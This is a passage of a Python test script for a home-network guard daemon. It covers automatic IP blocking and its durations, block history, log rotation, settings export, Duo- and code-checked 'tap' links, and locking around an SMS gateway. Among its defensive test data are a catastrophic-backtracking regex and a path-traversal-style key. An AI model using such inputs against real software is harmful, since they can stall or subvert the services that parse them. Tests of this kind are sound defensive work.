print('the notification log weighs a stranger guessing and leaves a browser and a phone alone')
print('the error log is weighed too, and the house is not blamed for its own slow answers')

# How long a block lasts is decided by what earned it and by whether that
# address has been here before. The same hour for a crawler and for somebody
# working at a lock says they are the same thing.
zigmon.CONFIG.update({'blacklist': 1, 'block_score': 15, 'block_mode': 'temporary',
                      'block_minutes': 60, 'block_minutes_serious': 240, 'block_repeat': 1,
                      'block_max_minutes': 10080, 'block_over_max': 'cap', 'never_block': '',
                      # the bar, plainly, rather than whatever an earlier
                      # check left the sensitivity at
                      'block_sensitivity': 'normal', 'block_private': 'gently'})
_was_within, zigmon.Daemon.SAME_TRY_WITHIN = zigmon.Daemon.SAME_TRY_WITHIN, 0


def _earn(ip, kind, n=12):
    d.store.unblock(ip)
    d.forget_anomaly(ip)
    for _i in range(n):
        d.note_anomaly(ip, kind, 'x%d' % _i)
    return [r for r in d.blocked_list() if r['ip'] == ip][0]


_ordinary = _earn('203.0.113.1', 'proxy-poking')
_serious = _earn('203.0.113.2', 'bad-secret')
assert 55 * 60 <= _ordinary['left'] <= 60 * 60, 'an ordinary block lasts %d min' % (_ordinary['left'] // 60)
assert 230 * 60 <= _serious['left'] <= 240 * 60, 'a serious one lasts %d min' % (_serious['left'] // 60)
assert _earn('203.0.113.3', 'proxy-junk')['left'] > 200 * 60, 'bytes that are not a request are not serious'
# ...and coming back doubles it
d._blocked_times.pop('203.0.113.4', None)
_lengths = [_earn('203.0.113.4', 'proxy-poking')['left'] // 60 + 1 for _ in range(4)]
assert _lengths[1] >= _lengths[0] * 2 - 2 and _lengths[3] >= _lengths[0] * 8 - 8, \
    'coming back does not double the block: %r' % _lengths
# the ceiling holds it
zigmon.CONFIG.update({'block_max_minutes': 120, 'block_over_max': 'cap'})
d._blocked_times['203.0.113.5'] = 6
assert _earn('203.0.113.5', 'proxy-poking')['left'] <= 121 * 60, 'the ceiling does not hold'
# ...or keeps it out for good
zigmon.CONFIG['block_over_max'] = 'forever'
d._blocked_times['203.0.113.6'] = 6
assert _earn('203.0.113.6', 'proxy-poking')['forever'], 'at the ceiling it was not kept out for good'
zigmon.CONFIG.update({'block_max_minutes': 10080, 'block_over_max': 'cap'})
zigmon.Daemon.SAME_TRY_WITHIN = _was_within
d.store.unblock()
d.forget_anomaly()
print('a block lasts by what earned it, doubles when they come back, and stops at the ceiling')

# A ladder instead of the doubling: ten minutes the first time, an hour the
# second, a day the third, for good after that - written out rather than
# worked out, because that is how somebody thinks about it.
zigmon.CONFIG['block_ladder'] = '10, 60, 1440, forever'
d._blocked_times.pop('203.0.113.20', None)
_rungs = []
for _ in range(5):
    _row = _earn('203.0.113.20', 'proxy-poking')
    _rungs.append('forever' if _row['forever'] else _row['left'] // 60 + 1)
assert _rungs[:4] == [10, 60, 1440, 'forever'], 'the ladder reads %r' % _rungs[:4]
assert _rungs[4] == 'forever', 'past the end it stopped being for good'
# something serious takes the step after the one it would have had
d._blocked_times.pop('203.0.113.21', None)
_first = _earn('203.0.113.21', 'bad-secret')
assert _first['left'] // 60 + 1 == 60, 'a serious first time took %d min' % (_first['left'] // 60 + 1)
# and the row says why it is that long
assert 'first time' in (_first['how'] or ''), 'the row does not say how it was decided: %r' % _first['how']
assert 'serious' in (_first['how'] or ''), 'nor that it counted as serious'
zigmon.CONFIG['block_ladder'] = ''
d.store.unblock()
d.forget_anomaly()
# ...and the card says what is actually in force. It read out the lengths and
# the doubling whatever else was set, so a house running a ladder was told
# about three numbers the ladder had taken over.
zigmon.CONFIG.update({'block_ladder': '', 'block_minutes': 60, 'block_minutes_serious': 0,
                      'block_repeat': 1})
_said = d.blocking_words()
assert 'ordinary' in _said and 'doubling' in _said, 'with no ladder it says %r' % _said
zigmon.CONFIG['block_ladder'] = '10, 60, 1440, forever'
_said = d.blocking_words()
assert _said.startswith('a ladder:'), 'with a ladder it still says %r' % _said
assert 'for good' in _said and 'doubling' not in _said, \
    'the ladder is described as though the doubling applied: %r' % _said
zigmon.CONFIG['block_ladder'] = ''
# The ladder has to forget. Counting for ever means an address that was a
# nuisance in March and has behaved ever since starts at the top of it in
# September - and the owner of a house, who trips his own guard now and then
# while testing it, ends up kept out for good with no way back but by hand.
zigmon.CONFIG.update({'block_ladder': '10, 60, 1440, forever', 'block_ladder_forget_days': 30})
_long_ago = time.time() - 120 * 86400
for _i in range(7):
    d.store.db.execute('INSERT INTO block_events (ts, ip, what, why, auto, by) VALUES (?,?,?,?,?,?)',
                       (_long_ago + _i * 3600, '45.9.148.20', 'blocked', 'long ago', 1, 'by itself'))
d.store.db.commit()
assert d.store.blocked_before('45.9.148.20') == 7, 'the story of the address was not written'
assert d.store.blocked_before('45.9.148.20', within_days=30) == 0, \
    'blocks from four months ago are counted as recent'
_mins, _words = d.block_length('45.9.148.20', [(time.time(), 'proxy-poking', 'GET /x')])
assert _mins == 10 and 'first time' in _words, \
    'seven old blocks still put it at the top of the ladder: %s' % _words
# ...and one that really has been back this week is where it belongs
for _i in range(3):
    d.store.db.execute('INSERT INTO block_events (ts, ip, what, why, auto, by) VALUES (?,?,?,?,?,?)',
                       (time.time() - _i * 86400, '45.9.148.21', 'blocked', 'lately', 1, 'by itself'))
d.store.db.commit()
_mins, _words = d.block_length('45.9.148.21', [(time.time(), 'proxy-poking', 'GET /x')])
assert _words == 'for good', 'three blocks this week did not reach the end of the ladder: %s' % _words
zigmon.CONFIG['block_ladder'] = ''
print('the ladder forgets an address that has behaved for a month')
print('a ladder written out is followed step by step, and every block says why it is that long')
print('the card says what is in force, not what would be if nothing else were set')

# It has to know where it stopped, or every reading weighs the whole log again
# and the same addresses are blocked over and over; and a log rotated away
# under it must be read from the top rather than skipped for ever.
zigmon.CONFIG.update({'proxy_host': 'p', 'proxy_log': '/var/log/nginx/t.log'})
d.store.set_meta('proxy_at', '0')
_state = {'text': ''}
_line = '185.234.9.%d - - [15/Sep/2026:13:37:2%d +0200] "GET /x HTTP/1.1" 404 146 "-" "-"\n'


def _fake_log(cmd):
    if cmd.startswith('stat'):
        return str(len(_state['text'].encode()))
    _at = int(cmd.split('+')[1].split()[0]) - 1
    return _state['text'][_at:_at + 2000000]


d.proxy_run = _fake_log
_state['text'] = ''.join(_line % (i, i % 10) for i in range(3))
assert len(d.proxy_read()) == 3, 'the first reading did not read what was there'
assert len(d.proxy_read()) == 0, 'it read the same lines twice - every address would be weighed again'
_state['text'] += ''.join(_line % (i, i % 10) for i in range(3, 5))
assert len(d.proxy_read()) == 2, 'it did not carry on where it stopped'
_state['text'] = ''.join(_line % (i, i % 10) for i in range(2))     # rotated away
assert len(d.proxy_read()) == 2, 'a rotated log was skipped rather than read from the top'
assert len(d.proxy_read()) == 0, 'and then read again'
zigmon.CONFIG['proxy_host'] = ''
d.store.unblock()
d.forget_anomaly()
print('the reading carries on where it stopped, and starts again when the log is rotated')

# A backup that leaves a key behind means finding it again by hand on the day
# the machine is being put back together, which is the day a backup is meant
# to save. The private halves travel only in an export that asked for the
# secrets; the public halves are not secret - they are what gets pasted onto
# the router and the proxy - so they travel in both.
for _which, _what in (('mikrotik', 'ROUTER'), ('proxy', 'PROXY')):
    d.store.set_meta('%s_key' % _which,
                     '-----BEGIN OPENSSH PRIVATE KEY-----\n%s\n-----END OPENSSH PRIVATE KEY-----' % _what)
    d.store.set_meta('%s_public' % _which, 'ssh-ed25519 AAAA%s zigmon-%s@house' % (_what, _which))
d.store.set_meta('ssh_public', 'ssh-ed25519 AAAAAP zigmon-ap@house')
d.save_scripts([{'name': 'Ban', 'body': 'ban {ip} 120'}])
_plain, _full = d.export_settings(), d.export_settings(secrets=True)
assert not any(v['private'] for v in _plain['keys'].values()), \
    'a private key travels in an export that did not ask for the secrets'
for _which in ('mikrotik', 'proxy', 'ssh'):
    assert _plain['keys'][_which]['public'], 'the public half for %s is left out' % _which
    if _which != 'ssh':
        assert _full['keys'][_which]['private'], 'the private half for %s is left out' % _which
assert [x['name'] for x in _plain['scripts']] == ['Ban'], 'the scripts are left out of an export'
# and a restore puts all of it back
_other = zigmon.Daemon()
_other.import_settings(_full)
for _which in ('mikrotik', 'proxy'):
    assert _other.store.get_meta('%s_key' % _which), 'the %s key did not come back' % _which
    assert _other.store.get_meta('%s_public' % _which), 'the %s public half did not come back' % _which
assert _other.store.get_meta('ssh_public'), 'the access point public half did not come back'
assert [x['name'] for x in _other.scripts()] == ['Ban'], 'the scripts did not come back'
# an export written before the keys travelled together is still understood
_other.store.set_meta('mikrotik_key', '')
_older = dict(_full)
_older.pop('keys')
_other.import_settings(_older)
assert _other.store.get_meta('mikrotik_key'), 'an older export no longer restores the router key'
d.save_scripts([])
print('every key and every script travels in the export, and comes back from it')

# A phrase is built into a pattern, so a phrase somebody writes badly must not
# be able to stop every message being read.
assert zigmon.Daemon.phrase_match('{ip}{ip}', 'unban aa') is None, 'a repeated name raised'
assert zigmon.Daemon.phrase_match('set {x} to {x}', 'set 5 to 5') == {'x': '5'}, \
    'a name mentioned twice does not match what it caught'
assert zigmon.Daemon.phrase_match('set {x} to {x}', 'set 5 to 6') is None, \
    'a name mentioned twice matched two different things'
assert zigmon.Daemon.phrase_match('[', 'x') is None, 'a phrase that is not a pattern raised'
assert zigmon.Daemon.phrase_match('(a+)+$', 'a' * 40) is None
print('a badly written phrase answers no and stops nothing')

# What a press carries is held to a size and to a name, on every road: a value
# is a room name or an address, not a book.
d.save_taps([{'name': 'Say', 'target': 'tell', 'do': 'own', 'text': '{room}'}])
zigmon.CONFIG['tap_mode'] = 'header'
zigmon.CONFIG['tap_code'] = 0
_ok, _answer = d.tap(d.taps()[0]['token'], '1.2.3.4', way='header',
                     carried={'room': 'x' * 5000, 'a' * 300: 'y', '../x': 'z', '': 'w'})
assert len(_answer.get('message') or '') <= 220, \
    'a press carried %d characters into a report' % len(_answer.get('message') or '')
d.store.set_meta('taps', json.dumps(_was_taps))
zigmon.CONFIG['tap_mode'] = 'both'
print('what a press carries is held to a name and to a size')

# The whole of it can be switched off. The addresses are kept - a house that
# turns it off for an afternoon should not have to write them out again - but
# nothing is enforced, and nothing of ours may be left on the router: a rule
# there that outlives the thing that made it is a rule nobody can explain.
d.store.unblock()
zigmon.CONFIG['blacklist'] = 1
d.store.block('89.24.9.9', None, 'a test', auto=False)
assert d.blacklist_on() and d.store.blocked_until('89.24.9.9') == 0
zigmon.CONFIG['blacklist'] = 0
assert not d.blacklist_on(), 'the switch does nothing'
assert len(d.store.blocked_all()) == 1, 'switching it off threw the addresses away'
_sent[:] = []
try:
    d.mikrotik_sync('while off')
    raise AssertionError('it filled the router while switched off')
except ValueError:
    pass
zigmon.CONFIG['blacklist'] = 1
print('the blacklist can be switched off without losing what it holds')

# A range, written the usual way: one line keeping out a street rather than
# thirty keeping out its houses.
d.store.unblock()
d.store.block('89.24.5.0/24', None, 'a street')
assert d.store.blocked_until('89.24.5.77') == 0, 'an address inside a blocked range was let through'
assert d.store.blocked_until('89.24.6.77') is None, 'an address outside it was kept out'
print('a range keeps out every address in it, and nothing outside it')

# A temporary one runs out by itself and goes into the history, which keeps
# every address that was ever kept out.
d.store.unblock()
d.store.forget_blocked_history()
d.store.block('1.2.3.4', time.time() + 1, 'briefly')
assert d.store.blocked_until('1.2.3.4') is not None
time.sleep(1.2)
assert d.store.blocked_until('1.2.3.4') is None, 'a block that ran out still keeps somebody out'
_past = d.store.blocked_history()
assert [(h['ip'], h['how']) for h in _past] == [('1.2.3.4', 'ran out')], 'it is not in the history: %r' % _past
d.store.block('1.2.3.5', None, 'by hand', auto=False)
d.store.unblock('1.2.3.5')
assert any(h['ip'] == '1.2.3.5' and h['how'] == 'taken off' for h in d.store.blocked_history())
assert d.store.forget_blocked_history() >= 2 and not d.store.blocked_history(), \
    'the history could not be erased'
print('a block that runs out goes into a history that keeps all of them')

# ...whether or not anybody asks about that address again. It used to happen
# only when the address itself came back, so a line sat on the list for ever
# saying "0 min" while the router had already dropped its own rule by timeout.
d.store.unblock()
d.store.forget_blocked_history()
d.store.block('1.1.1.1', time.time() + 1, 'briefly', auto=False)
d.store.block('2.2.2.2', None, 'for good', auto=False)
time.sleep(1.3)
_left = [r['ip'] for r in d.blocked_list()]
assert _left == ['2.2.2.2'], 'one whose time ran out is still on the list: %r' % _left
assert any(h['ip'] == '1.1.1.1' and h['what'] == 'let back in' and h['why'] == 'ran out'
           for h in d.store.block_events(10)[0]), 'nothing was written down about it running out'
d.store.unblock()
print('a block whose time runs out leaves the list without being asked about')

# Nothing trimmed the press log or the story of an address: a link open to the
# internet writes a line for every press and every refusal, and a year of that
# is a table nobody asked for.
_old = time.time() - 200 * 86400
d.store.flush()
d.store.forget_tap_log()
d.store.forget_blocked_history()
with d.store.lock:
    for _i in range(20):
        d.store.db.execute(
            'INSERT INTO taps_log (ts,ticket,link,who,way,state,message,times) '
            'VALUES (?,?,?,?,?,?,?,1)', (_old, 'old%d' % _i, 'L', '1.1.1.1', 'x', 'done', 'ok'))
        d.store.db.execute('INSERT INTO block_events (ts,ip,what,why,auto,by) VALUES (?,?,?,?,1,"")',
                           (_old, '1.1.1.%d' % _i, 'blocked', 'old'))
    d.store.db.commit()
d.store.log_tap({'ts': time.time(), 'ticket': 'new', 'link': 'L', 'who': '1.1.1.1', 'way': 'x',
                 'state': 'done', 'message': 'ok'})
d.store.note_block_event('9.9.9.9', 'blocked', 'today')
d.store.flush()
assert d.store.tap_log(1)[2] == 21 and d.store.block_events(1)[2] == 21, 'the rows were not written'
zigmon.CONFIG['retain_presses_days'] = 180
d.store.aggregate()
d.store.flush()
assert d.store.tap_log(1)[2] == 1, 'old presses are kept for ever: %d left' % d.store.tap_log(1)[2]
assert d.store.block_events(1)[2] == 1, 'the story of an address is kept for ever'
d.store.forget_tap_log()
d.store.forget_blocked_history()
print('the press log and the story of an address are trimmed with everything else')

# And it is a log, not a summary: a block and the letting go of it are two
# things at two times, each on its own line, in the order they happened -
# whether the letting go was the clock or a person.
d.store.unblock()
d.store.forget_blocked_history()
d.store.block('89.24.40.1', time.time() + 1, 'three wrong secrets', auto=True)
d.store.block('10.0.0.5', None, 'by hand', auto=False, by='me')
time.sleep(1.2)
d.store.blocked_until('89.24.40.1')                 # lets it run out
d.store.unblock('10.0.0.5')
d.store.flush()
_story, _matched, _total = d.store.block_events(50)
assert _total >= 4, 'four things happened and %d were written down' % _total
assert [r['ts'] for r in _story] == sorted([r['ts'] for r in _story], reverse=True), \
    'the log is not in the order it happened'
_kinds = {(r['ip'], r['what'], r['why']) for r in _story}
assert ('89.24.40.1', 'blocked', 'three wrong secrets') in _kinds
assert ('89.24.40.1', 'let back in', 'ran out') in _kinds, 'a block running out is not a line of its own'
assert ('10.0.0.5', 'let back in', 'taken off') in _kinds, 'letting one back in is not a line of its own'
assert any(r['ip'] == '10.0.0.5' and r['what'] == 'blocked' and not r['auto'] for r in _story), \
    'it does not say a person did it'
_found, _m, _t = d.store.block_events(50, '10.0.0.5')
assert _m == 2 and all(r['ip'] == '10.0.0.5' for r in _found), 'searching the log found the wrong lines'
d.store.forget_blocked_history()
print('every block and every letting go is a line of its own, and can be searched')

# How keen it is moves the bar, and nothing else about it.
for _lean, _blocked in (('forgiving', False), ('normal', True), ('keen', True)):
    zigmon.CONFIG['block_sensitivity'] = _lean
    d.store.unblock()
    d._anomaly.clear()
    for _i in range(3):
        d.note_anomaly('77.0.0.1', 'bad-secret', 'link %d' % _i)
    assert (d.store.blocked_until('77.0.0.1') is not None) is _blocked, \
        'three wrong secrets with %s did the wrong thing' % _lean
zigmon.CONFIG['block_sensitivity'] = 'normal'
d.store.unblock()
print('forgiving asks for more than normal, and keen for less')

# What was tried, not how many times it was tried. One wrong secret over and
# over is a shortcut nobody rewrote; a dozen different ones is somebody
# working through a list, and the second must not have to wait as long.
zigmon.CONFIG.update({'block_mode': 'temporary', 'block_score': 15, 'block_sensitivity': 'normal',
                      'tap_mode': 'both', 'block_private': 'gently'})


def _tries(ip, n, same=True):
    """n tries, as a person makes them - far enough apart that they are not
    taken for one browser asking twice."""
    d._anomaly.pop(ip, None)
    d.store.unblock(ip)
    was, zigmon.Daemon.SAME_TRY_WITHIN = zigmon.Daemon.SAME_TRY_WITHIN, 0
    try:
        for _i in range(n):
            d.tap('wrong-secret' if same else 'wrong-secret-%d' % _i, ip, way='link')
    finally:
        zigmon.Daemon.SAME_TRY_WITHIN = was
    return d.store.blocked_until(ip) is not None


assert _tries('89.24.30.1', 2, same=False) is False, 'two tries from a stranger is already a block'
assert _tries('89.24.30.2', 3, same=False) is True, 'three different secrets were let by'
# the house has to try three times as hard, and is never shut out for good
assert _tries('192.168.40.12', 4) is False, 'four from the house is a block'
assert _tries('192.168.40.12', 15) is True, 'fifteen refusals from one address were let by'
assert d.store.blocked_until('192.168.40.12') > time.time(), 'the house was blocked for good'
zigmon.CONFIG['block_private'] = 'never'
assert _tries('192.168.40.12', 15) is False, '"never" still blocked the house'
zigmon.CONFIG['block_private'] = 'same'
assert _tries('192.168.40.12', 3, same=False) is True, '"same" did not treat the house as anybody'
zigmon.CONFIG['block_private'] = 'gently'
d.store.unblock()
print('a stale shortcut is told from somebody working through a list')

# And why a block was earned, said in words. "3 in 10 min: bad-secret" is what
# the daemon thinks; what somebody reading the list wants is what was done.
d.store.unblock()
d._anomaly.pop('89.24.32.1', None)
for _i in range(4):
    d.tap('nope-%d' % _i, '89.24.32.1', way='link')
_why = [r['why'] for r in d.blocked_list() if r['ip'] == '89.24.32.1'][0]
assert 'bad-secret' not in _why, 'the shorthand is still on the line: %s' % _why
assert 'a secret that opens nothing' in _why, 'it does not say what was done: %s' % _why
assert 'different ones' in _why, 'it does not say they were different: %s' % _why
d.store.unblock()
d._anomaly.pop('89.24.32.2', None)
zigmon.Daemon.SAME_TRY_WITHIN = 0          # four tries, not one browser asking four times
for _i in range(4):
    d.tap('the-same', '89.24.32.2', way='link')
zigmon.Daemon.SAME_TRY_WITHIN = 2.0
_why = [r['why'] for r in d.blocked_list() if r['ip'] == '89.24.32.2'][0]
assert 'the same one each time' in _why, 'it does not tell one secret from many: %s' % _why
d.store.unblock()
print('a block says in words what earned it')

# What an address has on its account is counted whether or not anybody is
# looking, and letting somebody back in while that weight still stood meant
# the next thing they did put them straight back on the list.
d.store.unblock()
d._anomaly.pop('89.24.33.1', None)
for _i in range(3):
    d.tap('nope-%d' % _i, '89.24.33.1', way='link')
assert d.store.blocked_until('89.24.33.1') is not None, 'three tries did not earn a block'
_watch = [c for c in d.anomaly_state() if c['ip'] == '89.24.33.1']
assert _watch and _watch[0]['score'] >= _watch[0]['bar'], 'the counter says nothing: %r' % _watch
assert _watch[0]['kinds'] and _watch[0]['kinds'][0]['words'], 'it does not say what it counted'
# taken off, and what it did taken off with it
d.ban_by_name('unban', '89.24.33.1', 'a test')
assert not [c for c in d.anomaly_state() if c['ip'] == '89.24.33.1'], \
    'letting one back in kept the weight against it'
d.tap('nope-again', '89.24.33.1', way='link')
assert d.store.blocked_until('89.24.33.1') is None, \
    'one try after being let back in put it straight back on the list'
# and the counter can be forgotten on its own, without letting anybody off
d._anomaly.pop('89.24.33.2', None)
d.tap('nope', '89.24.33.2', way='link')
assert d.forget_anomaly('89.24.33.2') == 1
assert not [c for c in d.anomaly_state() if c['ip'] == '89.24.33.2']
d.store.unblock()
print('what an address has on its account can be seen, and is forgotten when it is let back in')

# The same counting whichever way the house is set to be opened: by address,
# by a header, with a code, with Duo. A secret that opens nothing is a secret
# that opens nothing.
for _mode, _factor in (('link', 'totp'), ('header', 'totp'), ('header', 'duo')):
    zigmon.CONFIG['tap_mode'] = _mode
    zigmon.CONFIG['tap_factor'] = _factor
    d._anomaly.pop('89.24.31.1', None)
    d.store.unblock('89.24.31.1')
    for _i in range(3):
        d.tap('nothing-%d' % _i, '89.24.31.1', way='header' if _mode == 'header' else 'link')
    assert d.store.blocked_until('89.24.31.1') is not None, \
        'three wrong secrets were let by with mode=%s factor=%s' % (_mode, _factor)
d.store.unblock()
zigmon.CONFIG['tap_mode'] = 'both'
print('the same counting whichever road and whatever second factor is set')
d.store.unblock()

# One link, one question at a time. A secret that has leaked can be pressed as
# fast as the network allows, and every press would be a push at somebody's
# phone and a request held open here waiting for an answer: the phone made
# unusable and the web server's workers with it, by somebody who has to be
# right about nothing but the secret.
zigmon.CONFIG['tap_mode'] = 'header'
zigmon.CONFIG['tap_code'] = 1
zigmon.CONFIG['tap_factor'] = 'duo'
zigmon.CONFIG.update({'duo_host': 'h', 'duo_ikey': 'i', 'duo_skey': 's', 'duo_user': 'u'})
_asked = []


def _slow(what, who=''):
    _asked.append(time.time())
    time.sleep(0.8)
    return True, 'approved'


d.duo_push = _slow
_tickets = [d.tap(token, '1.2.3.4', way='header')[1]['ticket'] for _ in range(20)]
assert len(set(_tickets)) == 1, 'twenty presses started %d questions' % len(set(_tickets))
time.sleep(1.2)
assert len(_asked) == 1, 'the phone was pushed %d times for one press' % len(_asked)
assert d.tap_waiting(_tickets[0], 3)[1]['state'] == 'done', 'the one question never finished'
print('a link pressed twenty times over asks once, and holds one request open')

# Each held request is a connection here and a web server worker with it, and
# there are only so many of those. Past the ceiling a press is answered at
# once with its ticket, and whoever wants the outcome comes back for it; the
# press itself is unaffected, since it is already asked.
_was_ceiling = d.HOLD_AT_ONCE
d.HOLD_AT_ONCE = 2
assert d.may_hold() and d.may_hold(), 'the first two were not let through'
assert not d.may_hold(), 'the ceiling did not hold'
d.let_go()
assert d.may_hold(), 'letting one go did not make room'
d.let_go(); d.let_go()
d.HOLD_AT_ONCE = _was_ceiling
print('only so many requests are held at once, and the rest are answered at once')

# Calling one off is not undoing it - nothing has happened yet. It tells the
# press that nobody is going to answer, so an approval arriving half a minute
# later finds it called off and does nothing.
_acted = []
d.duo_push = lambda what, who='': (time.sleep(0.6) or (True, 'approved'))
_real_do = d.tap_do
d.tap_do = lambda found, **kw: (_acted.append(found['name']) or (True, {'message': 'done'}))
_ok, _answer = d.tap(token, '1.2.3.4', way='header')
_ticket = _answer['ticket']
_seen = [x for x in d.approvals()['waiting'] if x['ticket'] == _ticket]
assert _seen, 'a press waiting to be approved is not on the list'
assert _seen[0]['link'] and _seen[0]['what'] and _seen[0]['left'] > 0, \
    'the list does not say what it would do or how long it has: %r' % (_seen[0],)
assert d.approval_stop(_ticket, who='the dashboard') == [_seen[0]['link']], 'it was not called off'
assert d.tap_waiting(_ticket, 1)[1]['state'] == 'stopped', 'the shortcut was not told'
time.sleep(1.0)
assert not _acted, 'the approval arrived afterwards and the thing happened anyway'
assert any(x['ticket'] == _ticket and x['state'] == 'stopped' for x in d.approvals()['recent']), \
    'it is not in what became of them'
d.tap_do = _real_do
print('a press can be called off, and an approval arriving after that does nothing')

# What a link does, said the way the rest of the page says it. A link that
# tells you something does not "own tell" anything: the two halves of its
# record are a target and an action, and read straight out they make nonsense
# of the one kind of link whose target is not a thing at all.
assert d.tap_words({'target': 'tell', 'do': 'house'}).startswith('tell you '), \
    'a telling link reads as nonsense: %r' % d.tap_words({'target': 'tell', 'do': 'house'})
assert 'own tell' not in d.tap_words({'target': 'tell', 'do': 'own'})
# and the device by the name Duo shows, not by the twenty letters of its id
d.store.set_meta('duo_devices', __import__('json').dumps(
    [{'device': 'DPQDHZC82JJ1TL6F00EB', 'name': 'iPhone16', 'capabilities': ['push']}]))
assert d.duo_device_name('DPQDHZC82JJ1TL6F00EB') == 'iPhone16', 'the device is shown by its id'
assert d.duo_device_name('auto') == '' and d.duo_device_name('DPNOSUCH') == 'DPNOSUCH'
print('a waiting press says what it would do and which device was rung, in words')

# The finished ones can be thrown away like any other recorded thing; what is
# still waiting is left alone, having not become anything yet.
d.duo_push = lambda what, who='': (time.sleep(5) or (True, 'approved'))
d.tap(token, '1.2.3.4', way='header')
_before = len(d.approvals()['waiting'])
assert d.approvals_forget() >= 0
assert len(d.approvals()['waiting']) == _before, 'erasing the history took a waiting press with it'
assert not d.approvals()['recent'], 'the history was not erased'
d.approval_stop(None)
print('the record of the finished ones can be erased, and the waiting ones are left')

# Every press is written down, not only the ones that wait for somebody: the
# list is worth looking at only if what is not in it did not happen. And it is
# in the database, so a restart does not lose it.
d.store.forget_tap_log()
zigmon.CONFIG['tap_mode'] = 'both'
zigmon.CONFIG['tap_code'] = 0
d.tap(token, '192.168.40.170', way='link')
d.tap(token, '192.168.40.170', way='header')
d.tap(token, '192.168.40.170', way='link', ask=True)
d.tap('not-a-real-token', '89.24.5.7', way='header')
d.store.flush()
_rows = d.approvals()['recent']
assert len(_rows) >= 4, 'four presses were written down as %d' % len(_rows)
_roads = {r['way'] for r in _rows}
assert _roads == {'by its address', 'by a header'}, 'the road is not said: %r' % _roads
assert any(r['state'] == 'refused' for r in _rows), 'a refused press is not in the list'
assert any(r['state'] == 'asked' for r in _rows), 'a press that only asked is not in the list'
assert all('none' in r['factor'] for r in _rows[:4]), 'it claims something checked these: %r' % _rows[0]
# the same through a code, and through Duo
zigmon.CONFIG['tap_mode'] = 'header'
zigmon.CONFIG['tap_code'] = 1
zigmon.CONFIG['tap_factor'] = 'totp'
d.tap(token, '10.0.0.2', way='header', code='000000')
zigmon.CONFIG['tap_factor'] = 'duo'
d.duo_push = lambda what, who='': (time.sleep(0.3) or (True, 'approved'))
d.tap(token, '10.0.0.2', way='header')
time.sleep(0.9)
d.store.flush()
_by = {r['factor'] for r in d.approvals()['recent']}
assert 'a code' in _by and 'Duo' in _by, 'what checked a press is not said: %r' % _by
assert len([r for r in d.approvals()['recent'] if r['state'] == 'done' and r['factor'] == 'Duo']) == 1, \
    'one press approved through Duo was written down twice'
# and it survives a restart, because it is in the database and not in memory
_kept = len(d.store.tap_log(500)[0])
d._waiting.clear()
assert len(d.approvals(500)['recent']) == _kept, 'the list lives in memory and would not survive a restart'
# and it is searched in the database rather than on the page
assert d.approvals(500, 'refused')['matched'] <= d.approvals(500)['matched'], 'the search widened it'
assert all(r['state'] == 'refused' for r in d.approvals(500, '', 'refused')['recent']), \
    'filtering by how it ended let something else through'
assert d.approvals(500)['total'] >= _kept, 'it does not say how many there are in all'
assert d.approvals_forget() == _kept and not d.approvals()['recent'], 'it could not be erased'
print('every press is written down with its road and what checked it, and it keeps')

# -- what the web server does with the address --------------------------------
# The address is the same for every link and carries no secret, so opening it
# in a browser - the first thing anybody does to see whether it is there - must
# be answered rather than refused. A bare 403 from nginx says nothing about
# why, and that is what it said at first.
conf = (Path(__file__).resolve().parent.parent / 'deploy' / 'nginx-zigmon.conf').read_text()
block = conf[conf.index('location = /tap {'):]
block = block[:block.index('\n    }')]
assert '$request_method != POST' in block, 'the header address is not held to POST'
assert 'return 405' in block and 'X-Zigmon-Tap' in block, \
    'a browser opening the header address is refused without being told why'
assert 'deny all' not in block, 'a bare refusal is back'
print('the header address answers a browser instead of refusing it')

print('\nboth roads, the code, the switch and the web server behave')



# ---------------------------------------------------------------------------
# The gateway takes one thing at a time
# ---------------------------------------------------------------------------
# A TRB140 serves one request at a time and takes seconds over each. The
# sending held a lock; the inbox read, the sweep and the status question held
# only a flag - and that flag goes up as a message is handed over, so a
# question asked a moment earlier was still in flight when the message went.
# The box then had two things to do, the send waited out its patience, and it
# was written down as "no answer from the gateway" while going out perfectly
# well. With the webhook on, looking set to never and tidying on - what this
# house runs - the sweep's own inbox read is the one still doing it.
#
# Checked by the thing itself rather than by racing two threads and hoping:
# while anything is talking to the gateway, another thread must not be able to
# take the lock. A race would pass on a quiet machine and fail on a busy one.
import threading as _th

_C = zigmon.CONFIG
_was = {k: _C.get(k) for k in ('sms_enabled', 'sms_push', 'sms_poll_s', 'sms_tidy',
                               'sms_api', 'sms_reply_timeout_s', 'sms_send_gap_s')}
_C['sms_enabled'], _C['sms_push'], _C['sms_poll_s'] = 1, 1, 0
_C['sms_tidy'], _C['sms_api'], _C['sms_reply_timeout_s'] = 1, 'rest', 60
_C['sms_send_gap_s'] = 0
d._sms_sent_at = d._sms_sending = d._sms_tidied = 0

_unguarded, _asked = [], []


def _needs_the_lock(path, method='GET', payload=None, retry=True, timeout=None):
    """Stand in for the gateway, and while pretending to be it, have a
    different thread try to take the lock. If it can, nothing was holding it
    and a second request could have gone out on top of this one."""
    _asked.append(path)
    _free = []

    def _try():
        if d._sms_send_lock.acquire(blocking=False):
            _free.append(path)
            d._sms_send_lock.release()
    _other = _th.Thread(target=_try, name='somebody-else')
    _other.start()
    _other.join(10)
    if _free:
        _unguarded.append(path)
    if path == '/messages/status':
        return [{'id': '3', 'sender': '+420603364754', 'text': 'Status',
                 'date': 'now', 'status': 'read'}]
    return {'success': True}


_real = (d._rest, d.sms_ready, d.sms_modem_id, d._sms_rest)
d._rest, d.sms_ready = _needs_the_lock, (lambda: True)
d.sms_modem_id, d._sms_rest = (lambda: '1-1'), (lambda: True)
try:
    d._sms_tidy_now = True
    d._sms_tidy(('+420603364754', 'Status'))          # the sweep, on a webhook
    d.sms_send('+420603364754', 'Doma jsou: Falco', why='reply')   # the answer
    d._sms_sending = d._sms_sent_at = 0               # let the pollers run
    d.sms_status_poll()                               # how the modem feels
    _C['sms_push'] = 0                                # ...and the other way of working
    _C['sms_poll_s'] = 1
    d._sms_last_poll = 0
    d.sms_poll()                                      # reading the inbox
    assert _asked, 'the gateway was never asked anything, so nothing was tested'
    assert not _unguarded, ('the gateway was asked for %r with nothing holding the lock, '
                            'so a second request could go out on top of it' % (sorted(set(_unguarded)),))

    # the lock must be reentrant: reading the inbox and then answering what
    # was found is one thread doing two things in a row, and a plain lock
    # deadlocked the polling way of working on the first message from a
    # number that may not give commands
    assert isinstance(d._sms_send_lock, type(_th.RLock())), \
        'the gateway lock is not reentrant; polling deadlocks on a refusal'
    with d._sms_send_lock:
        assert d._sms_send_lock.acquire(timeout=5), 'the gateway lock will not re-enter'
